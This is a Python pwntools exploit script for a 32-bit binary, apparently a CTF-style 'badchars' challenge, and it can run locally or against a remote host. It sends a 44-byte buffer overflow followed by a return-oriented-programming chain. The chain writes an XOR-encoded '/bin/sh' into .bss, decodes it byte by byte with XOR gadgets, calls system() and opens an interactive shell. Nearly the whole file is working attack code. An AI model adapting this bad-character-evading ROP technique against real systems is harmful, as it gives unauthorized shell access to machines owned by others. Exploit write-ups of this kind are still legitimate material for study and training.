import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)


if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###
system_plt = 0x080484e0
xor_ebx_cl = 0x08048890
pop_esi_edi_ret = 0x8048899
pop_ebx_ecx_ret = 0x8048896
mov_edi_esi_ret = 0x8048893
bss_addr = 0x0804a040

def bytes_xor(bytes_1):
    return bytes([_a ^ 0xff for _a in bytes_1])

    ###main###
def main():
    ###payload###
    payload = b"A" * 44
    
    payload += p32(pop_esi_edi_ret)
    payload += bytes_xor(b"/bin")
    payload += p32(bss_addr + 0x200)
    payload += p32(mov_edi_esi_ret) 

    payload += p32(pop_esi_edi_ret)
    payload += bytes_xor(b"/sh\x00") 
    payload += p32(bss_addr + 0x204)
    payload += p32(mov_edi_esi_ret)
    
    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x200)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)

    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x201)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)
    
    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x202)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)

    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x203)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)

    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x204)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)

    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x205)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)

    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x206)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)

    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + 0x207)
    payload += p32(0xffffffff)
    payload += p32(xor_ebx_cl)
    
    payload += p32(system_plt)
    payload += b"BBBB"
    payload += p32(bss_addr + 0x200)
    
    
    print(payload)
    _ = target.recvuntil("> ")
    target.sendline(payload)
    #print(target.recv(256))

    target.interactive()
    
if __name__ == "__main__":
    main()
